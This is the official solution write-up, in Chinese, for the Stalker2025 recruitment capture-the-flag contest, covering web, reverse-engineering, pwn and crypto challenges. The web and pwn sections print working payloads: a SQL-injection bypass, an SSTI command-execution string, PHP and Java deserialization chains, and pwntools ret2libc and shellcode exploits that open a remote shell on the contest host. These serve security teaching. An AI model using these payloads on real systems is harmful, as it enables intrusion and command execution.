---
title: Stalker2025招新赛官方WP
date: 2025-11-06 10:47:03
updated: 2025-11-12 03:24:18
tags:
  - WriteUp
  - CTF
---
# recruitment poster

根据题目名在招新海报中找到flag

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762848629049-871f9982-ddb9-4218-9bc2-ab4a4d076877.png)

# WEB

## 签个到吧~

考点：查看源代码

访问容器

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762785073365-fdd8ee32-d820-4851-8821-a09aa3b04379.png)

在跳转前Ctrl+U查看源代码获取flag

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762785176380-df6bf4d2-569d-4f51-a2ad-52a29dfe8bbb.png)

## ezHttp

考点：http协议

根据提示一步一步修改、添加 请求方式、请求参数和请求头

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762785724780-822837ef-ccac-441d-b0cc-2728c040e740.png)![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762841556241-32205deb-2f9e-4ca1-b65d-62545f637423.png)

## testPage

考点：信息收集、SQL注入

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762785783599-a835d7b7-849a-4da9-a59c-9a548a6479f5.png)

访问/robots.txt获得线索/admin\_login\_test.php

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762785809126-4c45ca31-137a-4d3d-9d64-eaa90275542d.png)

访问/admin\_login\_test.php，尝试sql注入，使用万能密码`'or 1=1#`获得flag

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762785885094-fec2f846-9834-49fc-8f1b-49375d14aa1d.png)

## 余佬的美照1

考点：文件上传

上传照片用burp抓包，上传一句话木马

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762786080853-1e96fc9f-19cf-4b8e-96e9-1619a6491ffb.png)

使用蚁剑连接，查看根目录下flag

![5a5fbef181754dc8e992c1262e6486a3.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762790529525-70f9460e-a6e1-49eb-baf5-c489c7cc298a.png)![f628571edb1794816cc475791cac3a4c.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762790662675-d63999b6-8ffd-425b-8917-9ff796998b6a.png)

在上一级目录找到`meizhao.png`(查看照片得到下一题flag的路径)

![884fb5fcd5bf8fb092cb2bb8aadbd841.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762790727127-0638c623-57dd-4b32-bb65-7ec1ee78a565.png)

## 余佬的美照2

考点：SSRF

用file协议读取flag

file:///home/www/html/likephoto/flag

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762790923719-13b8d929-d6a3-4b33-954f-68f3faf8de49.png)![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762791001133-bbf10e44-0308-46e0-b6a9-ae1637f897a8.png)

## 神的回应

考点：SSTI、RCE及其绕过

&#123;&#123;7\*7&#125;&#125;，回显49，存在模板注入

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762841122783-1ecdb3ea-08dd-4869-afc6-b83720f2fd4c.png)

执行命令读取flag，flag做了过滤，`*`绕过即可

```python
{{lipsum.__globals__.__builtins__['__import__']('os').popen('ls /').read()}}
{{lipsum.__globals__.__builtins__['__import__']('os').popen('cat /flag').read()}}
{{lipsum.__globals__.__builtins__['__import__']('os').popen('cat /fla*').read()}}
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762841194064-e4154bcd-3bb7-410f-baf7-b96383694c1c.png)![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762841275853-45e1e566-b4a6-40a0-9bb0-0da1fa10df48.png)

## babyPop

考点：PHP反序列化

**解法1：**

利用链如下：

1.  反序列化一个A对象。
2.  当对象销毁时，触发`__destruct`方法。
3.  `__destruct`方法将`$this->a`作为函数调用，参数是`$this->evil`。
4.  在exp中，`$this->a`是"system"，`$this->evil`是"cat /flag"，所以执行`system("cat /flag")`。

```php
<?php

class A {
    // 注意 private 属性的序列化哦
    private $evil = "cat /flag";

    // 如何赋值呢
    private $a = "system";
}
$a = new A();

$payload = serialize($a);
echo "Serialized payload: " . $payload . "\n";
echo "URL encoded: " . urlencode($payload) . "\n";

//Serialized payload: O:1:"A":2:{s:7:"Aevil";s:9:"cat /flag";s:4:"Aa";s:6:"system";}
//URL encoded: O%3A1%3A%22A%22%3A2%3A%7Bs%3A7%3A%22%00A%00evil%22%3Bs%3A9%3A%22cat+%2Fflag%22%3Bs%3A4%3A%22%00A%00a%22%3Bs%3A6%3A%22system%22%3B%7D
```

**解法2：**

分析：

-   类`A`的`__destruct`方法在对象销毁时被调用，其中`$this->a`作为函数执行，参数为`$this->evil`。
-   类`B`的`__invoke`方法在对象被作为函数调用时触发，其中`$this->b`作为函数执行，参数为传入的`$c`。
-   通过反序列化链，可以将`A`的`$a`属性设置为`B`对象，从而触发`B`的`__invoke`方法，最终执行系统命令。

利用链如下：

1.  反序列化`A`对象 → 触发`__destruct` → 调用`$this->a($this->evil)`（其中`$this->a`为`B`对象）。
2.  触发`B`的`__invoke`方法 → 调用`$this->b($c)`（其中`$this->b`为`system`函数，`$c`为`$this->evil`中的命令）

```php
<?php

class A {
    public $evil;
    public $a;
}

class B {
    public $b;
}

$cmd = 'cat /flag';

$b = new B();
$b->b = 'system'; // 设置B的$b属性为system函数

$a = new A();
$a->evil = $cmd;   // 设置要执行的命令
$a->a = $b;   

$payload = serialize($a);
echo "Serialized payload: " . $payload . "\n";
echo "URL encoded: " . urlencode($payload) . "\n";

//Serialized payload: O:1:"A":2:{s:4:"evil";s:9:"cat /flag";s:1:"a";O:1:"B":1:{s:1:"b";s:6:"system";}}
//URL encoded: O%3A1%3A%22A%22%3A2%3A%7Bs%3A4%3A%22evil%22%3Bs%3A9%3A%22cat+%2Fflag%22%3Bs%3A1%3A%22a%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A6%3A%22system%22%3B%7D%7D
```

## ezPhp

考点：php特性

第一层：md5弱比较Bypass

第二层：md5强比较Bypass

第三层：`preg_replace函数`双写Bypass

第四层：科学计数法Bypass

第五层：PHP的字符串解析特性Bypass，`$Stalker`变量的值，通过dirsearch扫到www.zip备份文件，从flag.php中得到`$Stalker = "Stalker2025";`![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762917738989-5dc63ceb-7ec8-4e49-b368-46afa7a306b4.png)

```http
POST /?md51[]=1&md52[]=2&str=StalStalkerker&num=3e9&where[is.it?=Stalker2025 HTTP/1.1
Host: 10.16.160.129:40033
Content-Type: application/x-www-form-urlencoded
Content-Length: 1007

md53=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&md54=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
```

## ezCalculation

考点：反混淆、脚本编写

**预期解：**

1.先找计算式

查看源码翻到底下看到提示

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762843953815-10ae2adb-96a4-4250-9755-3b4a1dac5f92.png)

能看出是python语言，这里主要就是对代码进行了混淆，语法不难，就是一些赋值、数组截取以及函数定义。由于我用了一些拼接，直接运行是会报错的。

这里整理好代码的空行格式，对参数名重命名为简单的参数名方便阅读。

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762843954069-e800e63a-bc0f-4890-8605-9c429fa2a9e6.png)

然后只需要对不合理的地方改一下，不报错运行即可

d->hex解密得到 base32 从而 得到 g = base32.decode(c) 解码得到 find url is the

e = base64.b64decode(b)[::-1] -》base64解码 得到ot tnaw，并字符串倒转得到

want to

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762843954448-9bc39719-61da-45d7-813e-fc4702ea2927.png)

```python
import random
import string
import base64

a = "what you"
b = "b3QgICB0bmF3"
c = "MZUW4ZBAOVZGYIDJOMQHI2DF"
d = "626173653332"

g = "find url is the"
e = "want  to"
def han1():
    e = "want  to"
    f = a + e
    return f
def han2():
    g = "find url is the"
    f = a + g
    return f
result = han1() + han2()
print("你想要的东西:"+result+g[6:7]+e[1:3]+g[3:4]+a[6:7]+b[9:10]+c[0:1]+e[1:2]+g[12:14])
```

randomMath 就是计算式所在的路由

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762843954784-7cd243b3-3962-45ad-9272-0370935ca855.png)

  

2.写脚本计算

由于计算式是几秒钟一变，且都是三个四位数之间加减乘除，靠手扣计算器是很难做出来的，所以这里需要通过python的request库来写脚本。

```python
import requests
from bs4 import BeautifulSoup

while True:

    url1 =  'http://localhost:8081/randomMath'  # 你的题目的地址

    resp1 = requests.get(url1)
    print(resp1.text)
    cookie = ''.join(resp1.cookies.values())
    print(cookie)

    soup = BeautifulSoup(resp1.text, 'html.parser')
    expression = soup.find('p', style=lambda s: s and 'font-size: 24px' in s).get_text(strip=True)
# print(expression)

    res = eval(expression)
# print(res)
        
#上半部分是获取计算式并且计算出结果，下半部分是提交答案，如果运算正确就会获取flag

    url2 = "http://localhost:8081/check"  # 你的题目地址
    cookie = {'JSESSIONID':cookie}
    data = {"answer":res}

    resp2 = requests.post(url2,data=data,cookies=cookie)
    print(resp2.text)
    if 'flag' in resp2.text:
        print(resp2.text)
        break
print(resp2.text)
```

注意：由于计算式的结果是绑定cookie的，randomMath页面每变一次cookie也会随着变化，cookie一变计算式结果也会变，请求的时候要保持cookie一致。且由于eval计算除法会有小数，而服务端计算式子的结果会保留整数。所以导致如果计算式存在除法大概率是算不对的，只需要等至无除法即可算对答案。

**非预期解：**

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762844366813-85ba7550-71dc-4442-972f-73d2ce7e427b.png)

## Ezunserialize

考点：Java反序列化

根据提示猜测序列化对象属性name="李奕飞"，age=18

```java
import java.io.*;
import java.util.Base64;

public class Person implements Serializable {

        private String name;
        private int age;

        public Person() {
        }

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getAge() {
            return age;
        }

        public void setName(String name) {
            this.name = name;
        }

        public void setAge(int age) {
            this.age = age;
        }

        @Override
        public String toString() {
            return "Person{" +
                    "name='" + name + '\'' +
                    ", age=" + age +
                    '}';
        }

}
```
```java
import java.io.*;
import java.util.Base64;

public class serialization {
    public static void main(String[] args) throws IOException {
        Person person = new Person("李奕飞", 18);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(person);
        oos.close();

        String base64Data = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println("Person序列化数据 (Base64):");
        System.out.println(base64Data);
    }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847484760-aab699e7-b84e-4c6c-b4e1-7117355ca1ca.png)

提交Person序列化数据 (Base64)，获得flag![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847504288-0464897f-fcc9-447a-8042-828d18165ff3.png)

## XXE OOB

考点：XXE数据外带、nday复现

参考这篇文章，在题目中只需将读取的文件修改成/flag以及将ip改为自己的即可

[链接](https://www.yuque.com/bigcolaxd/gpdcd1/hmu8zsu4tyf84eqk)

## Javavavavava

考点：Java代码审计、Java反序列化

dirsearch扫目录发现/static路径

![22ba533c31363937dcac606ad8024ee2.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762782972306-bf7f77dd-e5e9-4ef5-aeab-55d0e36e81a7.png)

访问发现源码泄露，下载后进行代码审计

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762783052132-fbb8bb9f-bf71-418a-93e6-417e45fcd095.png)

查看controllers层，查看`IndexController类`的代码发现/static路由查看的是/app/static目录下的文件

IndexController.java

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762784332013-0cacf524-e453-4d5d-8a67-5617d7155d15.png)

查看`VulnController类`的代码，定位到/api/request路由，即反序列化入口

VulnController.java

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762784300959-b320a551-8b6a-4a3d-92c6-b1600d774187.png)

接下来只要通过构造CC3.2.1(InvokerTransformer)链payload，将payload进行AES加密后再base64编码即可：

1.用JavaChains生成payload的raw文件，执行的命令设为`cp /flag /app/static/flag`

![ea222f7aea44a365b01da00707d0f030.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762784591693-4f090294-a417-45f1-9b10-8882d7284b89.png)

2.编写脚本将生成的rce.ser文件进行AES加密后再base64编码

```java
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class generate_payload {
    private static final String AES_KEY = "WELC0METOSTALKER"; // 16字节
    private static final String AES_IV = "2025102520251108";  // 16字节

    public static void main(String[] args) throws Exception {

        byte[] rawData = Files.readAllBytes(Paths.get("/Users/bigcolaxd/IdeaProjects/web/src/main/java/rce.ser"));//生成的raw文件

        SecretKeySpec keySpec = new SecretKeySpec(AES_KEY.getBytes(), "AES");
        IvParameterSpec ivSpec = new IvParameterSpec(AES_IV.getBytes());

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);

        byte[] encrypted = cipher.doFinal(rawData);
        String encoded = Base64.getEncoder().encodeToString(encrypted);

        System.out.println("【加密结果】\n" + encoded);
    }
}

```

3.将执行结果拿到反序列化入口对应路由构造请求

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762784744905-dec78244-9405-4452-aa2a-91be7203e0de.png)

刷新/static路由拿到flag

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762784832601-809aa00a-a457-4b63-8d10-f91e24a45a4f.png)

# Reverse

## level-1

用ida分析反编译源码，找到加密后的flag和加密逻辑

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762414127100-ba6659d9-f152-454f-8915-6c6857614eac.png)

加密逻辑就是遍历每一个字符异或0xA，异或加密只需将密文再次异或相同内容即可

```python
e_flag = "Y^KFAOXqYodncdmU~boUbcmboy~UzxkcyoU~eUCnkkkw"

flag = []
for i in range (len(e_flag)):
    flag.append(ord(e_flag[i])^0xa)

print("".join(chr(i) for i in flag))
```

## 0level

分析反编译源码，找到win函数，其中有疑似flag的加密数据

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762419969537-902a2c11-abd6-41b1-85e1-2f3d88febb79.png)

在现代windows操作系统中，数据以小端序形式在内存中存储，即每8个字节为一组，在每一组中，存储顺序是反的

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762420347506-946b507a-a1f2-486b-a629-8e00c780d0e2.png)

转化成字符串形式，依次逆序得到fVIzX2YwX2VSMGNfM0h2X0RuMWZfVXtSRUtMQVRT

随后用程序给出的码表进行base64解码

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762420602812-4afeb5d2-b4b5-45db-9f9f-5855116d14f9.png)

再将得到的结果逆序就是flag

## level2

使用pyinstxtractor进行解包

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762421002308-7e7c19d7-9ae3-492b-8552-6da1657fc7b3.png)

程序源码在ezpy.pyc中

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762421082002-cad66a55-eda7-4b7a-a0cd-da9a10e1efc9.png)

反编译pyc文件得到源码，加密过程很简单，参考level-1即可

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762421205558-4eabd69f-f73b-42ee-adfa-58752b0880c8.png)

## Secret

ida`shift+f12`查看字符串发现一个奇怪的提示

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762421694561-7f476c61-92d1-47d7-aada-44321c55ac04.png)

跟进到调用

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762421791684-c15e8ffd-e9f4-4c30-99d8-202a54e9f5a3.png)

因为如果程序正常运行的话，是不会运行到这个代码段的，ida也不会在c语言反编译代码中显示，

只有看汇编代码才能发现

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762421998181-1615e0ab-3b28-46be-8525-09ed4e040e39.png)

这里定义了个常量为0，只有等于1时才会跳转到目标代码段

动态调试或者直接用keypatch更改比较逻辑皆可

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762422278884-18718042-fadd-4132-99a0-ebf8cdf64c26.png)

## Maze

这个函数可以打印出地图

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762749902695-60fa34a0-bd98-4abc-aeba-9518de7ec3c2.png)

将字符串设成utf-8格式ida可以直接显示

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762750022996-c58370b9-ecea-4ef3-9e5b-24ed35f248f5.png)

或者用gdb调试，直接跳到这个函数也可以

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762750226363-55cae620-ed27-4fbf-82e8-7d9e7fb9f0a5.png)

至于这个超级长的sleep可以直接nop掉，或者用gdb直接跳到后面的代码

（要注意在数据加载完成后再跳转）

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762750269430-4739cfbc-8268-4ce9-a0f7-00355043f06f.png)

这里展示第二种方法

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762750855982-dda500c2-acbc-4683-9c28-ec33be742af3.png)

## Crusher

把字符串转化成utf-8编码，可以判断只有第一个分支是对的，只需要关注byte\_4020相关的变换就行

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762751304450-167440e7-011b-4ee7-a199-98b4543421ce.png)

```python
encry = [0x88, 0xD8, 0xD1, 0x86, 0x4F, 0x83, 0xA7, 0x57, 
         0xDF, 0xCC, 0x1B, 0x83, 0x9C, 0x15, 0xAC, 0x23, 
         0x09, 0xA2, 0xA7, 0x4F, 0x83, 0x9D, 0x2E, 0xCA, 
         0xAC, 0x4C, 0x94, 0xC2, 0x1E, 0x8F, 0x9E, 0x01, 
         0xB5, 0xB0, 0x31, 0xAB, 0xB4, 0x2E, 0xB4]

# 第一次交换
temp = encry[15]
encry[15] = encry[1]
encry[1] = temp

# 第1轮置换操作
for i in range(0, 19):
    tmep = encry[i]
    encry[i] = encry[0x26 - i]
    encry[0x26 - i] = tmep

# 第一轮异或操作
for i in range(len(encry)):
    if i % 3 == 0:
        encry[i] = encry[i] ^ 0x23
    elif i % 3 == 1:
        encry[i] = encry[i] ^ 0x7d
    else:
        encry[i] = encry[i] ^ 0xfe

# 第二次异或
for i in range(len(encry)):
    if i % 3 == 0:
        encry[i] = encry[i] ^ 0x6c
    elif i % 3 == 1:
        encry[i] = encry[i] ^ 0xaf
    else:
        encry[i] = encry[i] ^ 0xa3

# 第三次异或
for i in range(len(encry)):
    encry[i] = encry[i] ^ 0xa8

# 第二次交换
temp = encry[22]
encry[22] = encry[11]
encry[11] = temp

print(encry)
print(''.join([chr(i) for i in encry]))
# STALKER{khdss6Y-Thd5RE7-Koida98-Rd5s6Y}
```

## LVFT!

ida提示反编译失败

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762751831426-aff8cf12-0642-4b23-ab7f-ce4c2f4bea76.png)

根据提示定位到对应的代码段，将干扰的花指令nop掉

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762751959165-23477639-83b1-4818-9754-81f8f4aa0129.png)

对fun,encrypt函数执行相同的操作，即可获得完整的c语言加密逻辑

```cpp
#include <stdio.h>
#include <stdint.h>

void decrypt(uint32_t *v, uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0xC6EF3720;  // 32 * delta
    uint32_t delta = 0x9e3779b9;
    uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3];
    
    for (int i = 0; i < 32; i++) {
        v1 -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0 -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum -= delta;
    }
    
    v[0] = v0;
    v[1] = v1;
}

int main() {
    uint32_t f[8] = {0x1454e79d,0x69507fb2,0xb5b1fcb8,0x98f95acf,0x3a496ef9,0x35ad3574,0x1ee5f74a,0x3d115031};
    uint32_t k[4] = {0x4D,0x69,0x6B,0x75};
    
    for(int i = 0; i < 8; i += 2) {
        decrypt((uint32_t*)f + i, k);
    }
    
    unsigned char result[33];
    for(int i = 0; i < 8; i++) {
        result[i*4] = (f[i] >> 24) & 0xFF;
        result[i*4 + 1] = (f[i] >> 16) & 0xFF;
        result[i*4 + 2] = (f[i] >> 8) & 0xFF;
        result[i*4 + 3] = f[i] & 0xFF;
    }
    result[32] = '\0';
    
    printf("解密结果: %s\n", result);
    return 0;
}
//STALKER{IReallyNeedCupOfFloralT}
```

# PWN

## hard\_nc

直接使用nc连接（白给的分不知道为什么都不做......）

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762752707540-cde22504-41f4-4527-8dc3-8c270f27efd2.png)

## 问卷调查

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762753007211-db928381-1a58-4515-96eb-cf6d209b5d80.png)

程序获取用户输入的字符，用src存储，上限为100

随后将使用strcpy命令把src复制给上限仅为10的v24

接着检查v25开始的六个字符是否为Canary,否则退出

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762753384389-b4b75415-3a9b-47b0-bab5-a5c9509b6afe.png)

然后判断v26是否为97（对应字符a）

打印出v27内容，并判断是否与v28相等

根据提示可以知道v27是Teto，v28是Miku

构造输入payload覆盖v27为Miku

`aaaaaaaaaaCanaryaaMiku`

![](https://cdn.nlark.com/yuque/0/2025/png/50924521/1762753730902-0e7bd93c-7d12-46de-b86c-807a94e8309d.png)

## babylibc

```python
from pwn import *
from LibcSearcher import *

p = remote('10.16.160.129', 40084)
#p = process('./attachment')
elf = ELF('./attachment')

main = 0x40118C
pop_rdi = 0x401181
ret = 0x40101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

offset = 0x130 + 8
payload =b'a' * offset
payload = payload + p64(pop_rdi)
payload = payload + p64(puts_got)
payload = payload + p64(puts_plt)
payload = payload + p64(main)
p.sendlineafter('Pwn me\n', payload)

puts_addr = u64(p.recvuntil('\n')[:-1].ljust(8, b'\0'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
Offset = puts_addr - libc.dump('puts')
binsh = 0x402004
system = Offset + libc.dump('system')
payload =b'a' * offset
payload = payload + p64(ret)
payload = payload + p64(pop_rdi)
payload = payload + p64(binsh)
payload = payload + p64(system)
p.sendlineafter('Pwn me\n', payload)

p.interactive()
```

## shellcode

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
r = remote('10.16.160.129', 40085)
#r = process('./shellcodee')

r.recvuntil('Hello Hacker, lets crash: ')
Target = int(r.recvuntil('\n')[:-1], 16)
log.info('Target: ' + hex(Target))
r.sendlineafter('Can u make it?', b'%21$p')
r.recvuntil('>')
Canary = int(r.recvuntil('\n')[:-1], 16)
log.info('Canary: ' + hex(Canary))
shellcode = asm(shellcraft.sh())

offset = 104
payload = shellcode.ljust(offset, b'\x90')
payload = payload + p64(Canary)
payload = payload + b'a'*8
payload = payload + p64(Target)

r.sendline(payload)

r.interactive()
```

# Crypto

这次密码学题目难度不高，现在AI发展迅速，绝大多数人的密码学题目是AI辅助做出，AI辅助学习本来是我们应该掌握的，无论是base还是各种编码还是各种加密方式无非就是想让大家快速入门并且去配置python环境，安装相应的库文件，让大家更快度过入门期。

## 签到

这道题刷过每个CTF做题平台密码学前几题的人都不陌生：键盘码，简单来说就是看给出的这四个字母在键盘上包围了谁，由此可以得到flag:flag{rookie}

## 什么叫做base

base编码是最常见的编码之一，常用的base编码有base16、base32、base64、base85、base92,还有很多base编码，那么什么叫做base编码：说白了就是用**更少的字符，来表示更多的数据，大家可以通过CSDN和AI对base编码进行更深层次的理解。回到题目，首先第一层是：**

**base58**

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847877460-cebda51e-0df3-4321-859c-e83eea3d6e3c.png)

**然后是base64**

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847877788-427c4cb8-63f8-40ab-a2bb-f9decc0100e4.png)

**下一层base32**

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847877987-4b6b1bca-e9be-4b26-8bde-3fafc8cbb4ad.png)

**最后一层base16**

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847878633-3c5d5180-6191-41d9-a1d6-44a566134813.png)

## 俄罗斯套娃

一个压缩包嵌套，CTF密码学里面，比较常见的集中编码以及古典加密方式：

第一层：莫斯

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847879025-7ca95ad1-0fc9-4992-a6a5-855ff4854aad.png)

MORSE1537

第二层：

Ook码：

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847879303-746da3f9-414b-4019-8c84-55b115c18b12.png)

Ook2233

第三层：

培根密码：

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847879468-6c35d1cf-bd5b-47b0-86eb-15de7707f0b6.png)

bacononeone

  

第四层：

Brainfuck:

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847879672-59e47244-0dfb-4d6d-bc5d-70fdfc5f183b.png)

brainfuck2389

  

  

第五层：

Jsfuck

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847879949-401a7632-332c-42d9-b4b1-6c1bc9757dd3.png)

jsfuck2222

第六层：

阴阳怪气：

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847880285-e5de291f-a732-4bdf-b131-5717e3e14549.png)

enigmatical

第七层：

ctf.bugku.com/tool/cvecode![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847880599-7ea5fc6c-aeed-4c22-a966-a4fb174856a2.png)

Corevalues1234

第八层：

Aaencode:

![](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762847880820-26fc22f5-d3d9-44af-aba6-bf7b3e6c2fd8.png)

aaencode7\_7

flag{moOobabrjsenCoaa7\_7}

## 你觉得你是base吗,我觉得我是

base64码表(破损,?代表需自行补充)

GH?3K?M??OPQRST??=c??fghij?lmnopWXYZ/12+406?89VaqrstuvwxyzA?CDEF

"A" ASCII = 65 = 01000001 Base64处理：010000 01xxxx → 需要补0：010000 010000 也就是16 16,对应UU 以此类推

因此第16位未知改为U,以此类推,

得到源码表: GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF

这是base换表

密文

\=MDzlxfukM1Vkx1angLsjgLYihS1SZ=OnMX0l29Oigu=

代码:

```python
import base64
import string
from Crypto.Util.number import *
str1 = "=MDzlxfukM1Vkx1angLsjgLYihS1SZ=OnMX0l29Oigu="
new  = "GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF"
inti = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
print (base64.b64decode(str1.translate(str.maketrans(new,inti))))
```

得到结果: Doyouthinkyouareabase64IthinkIam\\x11(取有效字母部分,后面的乱码就不要了)

## 梭哈的美学

输出 密文5965732C796F75206172652072696768743A3430343437326236616235623534393162373732306663613661616638346236

密码596F75206469642069743A66726573686D616E32303234 (提示:输出都用同一个base加密)

翻一遍base发现base16解出来

Yes,you are right:404472b6ab5b5491b7720fca6aaf84b6 和You did it:freshman2024

得到密文和密码,代码解:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib
def decrypt_aes():
    ciphertext_hex = "404472b6ab5b5491b7720fca6aaf84b6"
    password = "freshman2024"
    key = hashlib.md5(password.encode('utf-8')).digest()
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = bytes.fromhex(ciphertext_hex)
    decrypted_padded = cipher.decrypt(ciphertext)
    plaintext_bytes = unpad(decrypted_padded, 16)
    plaintext = plaintext_bytes.decode('ascii')
    return plaintext
if __name__ == "__main__":
    result = decrypt_aes()
    print(f"解密出的原文: {result}")
```

代码解出结果: Crypto is fun!

## 中国机长

base这个单词我教了4遍都没学会,提示将密文base64解4遍得:

ZHBKLH GUJ ql wgzbsdosokonobptreuk

小明是一个喜欢古典文学的人,同时也是一个喜欢破解密钥的密码高手.提示古典密码且需要密钥.

我发现一个1989年的动画片确实很好看.根据题目名得知是舒克和贝塔

要密钥的古典密码没几个,试一下是经典的维吉尼亚,key是:shukehebeita

